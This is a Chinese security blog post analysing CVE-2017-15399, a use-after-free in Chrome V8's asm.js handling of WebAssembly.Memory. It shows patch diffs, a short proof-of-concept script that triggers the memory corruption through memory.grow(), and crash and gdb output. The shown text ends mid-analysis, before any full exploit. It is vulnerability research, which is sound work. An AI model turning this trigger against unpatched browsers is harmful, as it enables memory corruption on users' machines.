<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;235504 0x00 前言之前一直在学习V8方面的漏洞，对于asm.js层的UAF漏洞还是第一次接触，本文将详细分析Chrome Issue 776677漏洞以及其利用方法。">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2017-15399">
<meta property="og:url" content="https://github.com/2021/04/07/CVE-2017-15399/index.html">
<meta property="og:site_name" content="ha1vk&#39;s blog">
<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;235504 0x00 前言之前一直在学习V8方面的漏洞，对于asm.js层的UAF漏洞还是第一次接触，本文将详细分析Chrome Issue 776677漏洞以及其利用方法。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-04-07T06:30:59.000Z">
<meta property="article:modified_time" content="2025-06-26T09:45:08.142Z">
<meta property="article:author" content="ha1vk">
<meta property="article:tag" content="JS引擎漏洞">
<meta property="article:tag" content="类型混淆">
<meta property="article:tag" content="heap spray">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/2021/04/07/CVE-2017-15399/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CVE-2017-15399 | ha1vk's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ha1vk's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/2021/04/07/CVE-2017-15399/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ha1vk">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ha1vk's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2017-15399
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-07 14:30:59" itemprop="dateCreated datePublished" datetime="2021-04-07T14:30:59+08:00">2021-04-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235504">https://www.anquanke.com/post/id/235504</a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前一直在学习V8方面的漏洞，对于asm.js层的UAF漏洞还是第一次接触，本文将详细分析Chrome Issue 776677漏洞以及其利用方法。</p>
<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="asm-js"><a href="#asm-js" class="headerlink" title="asm.js"></a>asm.js</h3><blockquote>
<p>asm.js不是一门新的语言，而是JavaScript的一个子集。由Mozilla于2013年提出，主要为了提升JS引擎执行代码的速度。通俗来说，同样是js代码，符合asm.js规范的代码对JS引擎更加友好，JS引擎在解释执行这些代码更加省心（例如不用进行变量类型推断了），也就更加快。<br>一旦 JavaScript 引擎发现运行的是 asm.js，就知道这是经过优化的代码，可以跳过语法分析这一步，直接转成汇编语言。另外，浏览器还会调用 WebGL 通过 GPU 执行 asm.js，即 asm.js 的执行引擎与普通的 JavaScript 脚本不同。这些都是 asm.js 运行较快的原因。据称，asm.js 在浏览器里的运行速度，大约是原生代码的50%左右。</p>
</blockquote>
<p>在asm.js 中，变量只有两种数据类型。<code>32位带符号整数</code>和<code>64位带符号浮点数</code><br>asm.js 的类型声明有固定写法，<code>变量 | 0</code>表示整数，<code>+变量</code>表示浮点数。如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a = 1;</span><br><span class="line"></span><br><span class="line">var x = a | 0;  // x 是32位整数</span><br><span class="line">var y = +a;  // y 是64位浮点数</span><br></pre></td></tr></table></figure>
<p>在javascript中，区别是<code>普通js</code>还是<code>asm.js</code>的关键在于函数里是否使用<code>&quot;use asm&quot;;</code>关键词修饰，在函数中，在<code>&quot;use asm&quot;;</code>关键词之后的代码都属于<code>asm.js</code>，如下，由于<code>module</code>第一行使用了该关键字，那么函数后面的代码都将使用<code>asm.js</code>将代码翻译为汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function module() &#123;</span><br><span class="line">  &quot;use asm&quot;;</span><br><span class="line">   function f(x) &#123;</span><br><span class="line">      x = x | 0;</span><br><span class="line">   &#125;</span><br><span class="line">   return f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var f = module();</span><br><span class="line"></span><br><span class="line">f(1);</span><br></pre></td></tr></table></figure>
<p>使用<code>./d8 t.js -print-opt-code</code>运行，可以看到，虽然没有多次循环触发<code>JIT</code>编译，但是仍然使用了<code>turbofan</code>进行编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">kind = JS_TO_WASM_FUNCTION</span><br><span class="line">name = js-to-wasm#0</span><br><span class="line">compiler = turbofan</span><br><span class="line">Instructions (size = 138)</span><br><span class="line">0x3f4062c0     0  55             push ebp</span><br><span class="line">0x3f4062c1     1  89e5           mov ebp,esp</span><br><span class="line">0x3f4062c3     3  56             push esi</span><br><span class="line">0x3f4062c4     4  57             push edi</span><br><span class="line">0x3f4062c5     5  8b4508         mov eax,[ebp+0x8]</span><br><span class="line">0x3f4062c8     8  e8d303f01f     call 0x5f3066a0  (ToNumber)    ;; code: BUILTIN</span><br><span class="line">0x3f4062cd     d  a801           test al,0x1</span><br><span class="line">0x3f4062cf     f  0f8528000000   jnz 0x3f4062fd  &lt;+0x3d&gt;</span><br><span class="line">0x3f4062d5    15  d1f8           sar eax,1</span><br><span class="line">0x3f4062d7    17  f20f2ac8       cvtsi2sd xmm1,eax</span><br><span class="line">0x3f4062db    1b  f20f2cc1       cvttsd2si eax,xmm1</span><br><span class="line">0x3f4062df    1f  83f801         cmp eax,0x1</span><br><span class="line">0x3f4062e2    22  0f8039000000   jo 0x3f406321  &lt;+0x61&gt;</span><br><span class="line">0x3f4062e8    28  be00000000     mov esi,(nil)               ;; wasm context reference</span><br><span class="line">0x3f4062ed    2d  e8cefeffff     call 0x3f4061c0             ;; code: BUILTIN</span><br><span class="line">0x3f4062f2    32  b885411839     mov eax,0x39184185          ;; object: 0x39184185 &lt;undefined&gt;</span><br><span class="line">0x3f4062f7    37  89ec           mov esp,ebp</span><br><span class="line">0x3f4062f9    39  5d             pop ebp</span><br><span class="line">0x3f4062fa    3a  c20800         ret 0x8</span><br><span class="line">0x3f4062fd    3d  b985411839     mov ecx,0x39184185          ;; object: 0x39184185 &lt;undefined&gt;</span><br><span class="line">0x3f406302    42  3bc1           cmp eax,ecx</span><br><span class="line">0x3f406304    44  0f8407000000   jz 0x3f406311  &lt;+0x51&gt;</span><br><span class="line">0x3f40630a    4a  f20f104803     movsd xmm1,[eax+0x3]</span><br><span class="line">0x3f40630f    4f  ebca           jmp 0x3f4062db  &lt;+0x1b&gt;</span><br><span class="line">0x3f406311    51  660f76c9       pcmpeqd xmm1,xmm1</span><br><span class="line">0x3f406315    55  660f73f134     psllq xmm1,52</span><br><span class="line">0x3f40631a    5a  660f73d101     psrlq xmm1,1</span><br><span class="line">0x3f40631f    5f  ebba           jmp 0x3f4062db  &lt;+0x1b&gt;</span><br><span class="line">0x3f406321    61  83ec08         sub esp,0x8</span><br><span class="line">0x3f406324    64  f20f110c24     movsd [esp],xmm1</span><br><span class="line">0x3f406329    69  e8d25ac0fc     call 0x3c00be00             ;; code: STUB, DoubleToIStub, minor: 0</span><br><span class="line">0x3f40632e    6e  83c408         add esp,0x8</span><br><span class="line">0x3f406331    71  ebb5           jmp 0x3f4062e8  &lt;+0x28&gt;</span><br><span class="line">0x3f406333    73  90             nop</span><br></pre></td></tr></table></figure>
<p>在<code>asm.js</code>中，不能直接调用<code>javascript</code>中的函数或者访问数据，如下会报错，找不到<code>print</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function module() &#123;</span><br><span class="line">  &quot;use asm&quot;;</span><br><span class="line">   function f(x) &#123;</span><br><span class="line">      x = x | 0;</span><br><span class="line">      print(x);</span><br><span class="line">   &#125;</span><br><span class="line">   return f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想要在<code>asm.js</code>中调用<code>js</code>中的函数和对象，必须使用函数参数来间接传递地址进行访问，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function module(stdlib) &#123;</span><br><span class="line">  &quot;use asm&quot;;</span><br><span class="line">   var p = stdlib.print;</span><br><span class="line">   function f(x) &#123;</span><br><span class="line">      x = x | 0;</span><br><span class="line">      p(x);</span><br><span class="line">   &#125;</span><br><span class="line">   return f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var stdlib = &#123;print:print&#125;;</span><br><span class="line">var f = module(stdlib);</span><br><span class="line">f(1);</span><br></pre></td></tr></table></figure>
<p>通常，一个标准的<code>asm.js</code>函数模块参数应该有三个<code>function module(stdlib,foreign,buffer) &#123;&#125;</code>，其中<code>stdlib</code>用来传递想要用到的一些函数，<code>foreign</code>用来传递一些变量,<code>buffer</code>用来共享内存。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function module(stdlib,foreign,buffer) &#123;</span><br><span class="line">  &quot;use asm&quot;;</span><br><span class="line">  var fl = new stdlib.Uint32Array(buffer);</span><br><span class="line">  function f1(x) &#123;</span><br><span class="line">    x = x | 0;</span><br><span class="line">    fl[0x11]  = x;</span><br><span class="line">  &#125;</span><br><span class="line">  return f1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var global = &#123;Uint32Array:Uint32Array&#125;;</span><br><span class="line">var env = &#123;&#125;;</span><br><span class="line">var buffer = new ArrayBuffer(0x100);</span><br><span class="line">var f = module(global,env,buffer);</span><br><span class="line"></span><br><span class="line">f(0x22);</span><br><span class="line">var dv = new DataView(buffer);</span><br><span class="line">print(dv.getUint32(0x11*4,true));</span><br></pre></td></tr></table></figure>
<p>如图，我们在<code>asm.js</code>里修改了<code>ArrayBuffer</code>的内容，然后在<code>js</code>层显示。<br>除了直接传入<code>ArrayBuffer</code>对象进行内存共享，还可以使用<code>WebAssembly.Memory</code>来构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var memory = new WebAssembly.Memory(&#123;initial:200&#125;);</span><br><span class="line">var buffer = memory.buffer;</span><br></pre></td></tr></table></figure>
<p>其返回的<code>buffer</code>也是一个<code>ArrayBuffer</code>对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x4cb18421: [JSArrayBuffer] in OldSpace</span><br><span class="line"> - map = 0x3b9047b9 [FastProperties]</span><br><span class="line"> - prototype = 0x4cb08ac5</span><br><span class="line"> - elements = 0x5450412d &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store = 0xf1dca000</span><br><span class="line"> - byte_length = 13107200</span><br><span class="line"> - wasm_buffer</span><br><span class="line"> - properties = 0x5450412d &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    (nil)</span><br><span class="line">    (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>initial:200</code>代表申请200页大小的内存，每页为<code>0x10000</code>。使用<code>WebAssembly.Memory</code>的好处是其申请的内存空间可以扩展，如果想要扩充空间，·只需调用<code>grow</code>函数。而<code>ArrayBuffer</code>的话不能做到空间扩充。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory.grow(1); //扩充1页的内存</span><br></pre></td></tr></table></figure>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><p>patch的地方比较多，经过分析，比较关键的地方是这两处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">index cecf460..24b9091 100644</span><br><span class="line">--- a/src/asmjs/asm-js.cc</span><br><span class="line">+++ b/src/asmjs/asm-js.cc</span><br><span class="line">@@ -374,6 +374,7 @@</span><br><span class="line">       ReportInstantiationFailure(script, position, &quot;Requires heap buffer&quot;);</span><br><span class="line">       return MaybeHandle&lt;Object&gt;();</span><br><span class="line">     &#125;</span><br><span class="line">+    memory-&gt;set_is_growable(false);</span><br><span class="line">     size_t size = NumberToSize(memory-&gt;byte_length());</span><br><span class="line">     // TODO(mstarzinger): We currently only limit byte length of the buffer to</span><br><span class="line">     // be a multiple of 8, we should enforce the stricter spec limits here.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/wasm/wasm-js.cc b/src/wasm/wasm-js.cc</span><br><span class="line">index bad1a21..631d94a 100644</span><br><span class="line">--- a/src/wasm/wasm-js.cc</span><br><span class="line">+++ b/src/wasm/wasm-js.cc</span><br><span class="line">@@ -753,6 +753,10 @@</span><br><span class="line">     max_size64 = i::FLAG_wasm_max_mem_pages;</span><br><span class="line">   &#125;</span><br><span class="line">   i::Handle&lt;i::JSArrayBuffer&gt; old_buffer(receiver-&gt;array_buffer());</span><br><span class="line">+  if (!old_buffer-&gt;is_growable()) &#123;</span><br><span class="line">+    thrower.RangeError(&quot;This memory cannot be grown&quot;);</span><br><span class="line">+    return;</span><br><span class="line">+  &#125;</span><br><span class="line">   uint32_t old_size =</span><br><span class="line">       old_buffer-&gt;byte_length()-&gt;Number() / i::wasm::kSpecMaxWasmMemoryPages;</span><br><span class="line">   int64_t new_size64 = old_size + delta_size;</span><br></pre></td></tr></table></figure>
<p>主要是为<code>asm.js</code>的<code>memory</code>设置了一个标记，不允许我们在memory传给<code>asm.js</code>的模块以后再调用<code>memory.grow()</code>函数。<br>其精简后的POC如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function module(stdlib,foreign,buffer) &#123;</span><br><span class="line">  &quot;use asm&quot;;</span><br><span class="line">  var fl = new stdlib.Uint32Array(buffer);</span><br><span class="line">  function f1(x) &#123;</span><br><span class="line">    x = x | 0;</span><br><span class="line">    fl[0] = x;</span><br><span class="line">  &#125;</span><br><span class="line">  return f1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var global = &#123;Uint32Array:Uint32Array&#125;;</span><br><span class="line">var env = &#123;&#125;;</span><br><span class="line">var memory = new WebAssembly.Memory(&#123;initial:200&#125;);</span><br><span class="line">var buffer = memory.buffer;</span><br><span class="line">var evil_f = module(global,env,buffer);</span><br><span class="line"></span><br><span class="line">memory.grow(1);</span><br><span class="line">evil_f(1);</span><br></pre></td></tr></table></figure>
<p>与前面的示例差不多，我们仅仅是增加了一句<code>memory.grow(1);</code>，然后调用函数以后就出现了崩溃。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/v8/out.gn/ia32.debug# ./d8 poc.js</span><br><span class="line">Received signal 11 SEGV_MAPERR 0000f1d64000</span><br><span class="line"></span><br><span class="line">==== C stack trace ===============================</span><br><span class="line"></span><br><span class="line"> [0x0000f58e4e80]</span><br><span class="line"> [0x0000f58e4d7a]</span><br><span class="line"> [0x0000f7f07b80]</span><br><span class="line"> [0x00004010658b]</span><br><span class="line"> [0x0000549fc522]</span><br><span class="line"> [0x0000549f9336]</span><br><span class="line"> [0x00005498608f]</span><br><span class="line"> [0x0000f6d7935f]</span><br><span class="line"> [0x0000f6d788a2]</span><br><span class="line"> [0x0000f6d786af]</span><br><span class="line"> [0x0000f61fbef6]</span><br><span class="line"> [0x0000565f7010]</span><br><span class="line"> [0x00005660c8c0]</span><br><span class="line"> [0x000056610ff3]</span><br><span class="line"> [0x000056612523]</span><br><span class="line"> [0x000056612912]</span><br><span class="line"> [0x0000f53ace91]</span><br><span class="line">[end of stack trace]</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>
<p>很明显是内存访问错误，使用gdb调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x4498658b in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">*EAX  0x1</span><br><span class="line">*EBX  0x0</span><br><span class="line">*ECX  0xc80000</span><br><span class="line">*EDX  0xf1d99000</span><br><span class="line">*EDI  0x44986580 ◂— mov    ecx, dword ptr [esi + 4] /* 0x8b044e8b */</span><br><span class="line">*ESI  0x56d586d0 ◂— 0xf1d99000</span><br><span class="line">*EBP  0xfff53ed4 —▸ 0xfff53f08 —▸ 0xfff53f20 —▸ 0xfff53f48 —▸ 0xfff540d8 ◂— ...</span><br><span class="line">*ESP  0xfff53ec8 —▸ 0x449862f2 ◂— mov    eax, 0x43a84185 /* 0xa84185b8 */</span><br><span class="line">*EIP  0x4498658b ◂— mov    dword ptr [edx + ebx], eax /* 0xc31a0489 */</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4498658b    mov    dword ptr [edx + ebx], eax</span><br><span class="line">   0x4498658e    ret </span><br></pre></td></tr></table></figure>
<p>查看该地址<code>0xf1d99000</code>的映射情况，可以发现这个地址不在映射之内</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.............</span><br><span class="line">0xf1109000 0xf1d99000 rw-p   c90000 0      </span><br><span class="line">0xf2a19000 0xf2c8e000 rw-p   275000 0      </span><br><span class="line">.............</span><br></pre></td></tr></table></figure>
<p>然而如果事先加了一个<code>%DebugPrint</code>将<code>buffer</code>打印的话，会发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x52698935: [JSArrayBuffer] in OldSpace</span><br><span class="line"> - map = 0x5ab047b9 [FastProperties]</span><br><span class="line"> - prototype = 0x52688ac5</span><br><span class="line"> - elements = 0x3628412d &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store = 0xf1d99000</span><br><span class="line"> - byte_length = 13107200</span><br><span class="line"> - wasm_buffer</span><br><span class="line"> - properties = 0x3628412d &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    (nil)</span><br><span class="line">    (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
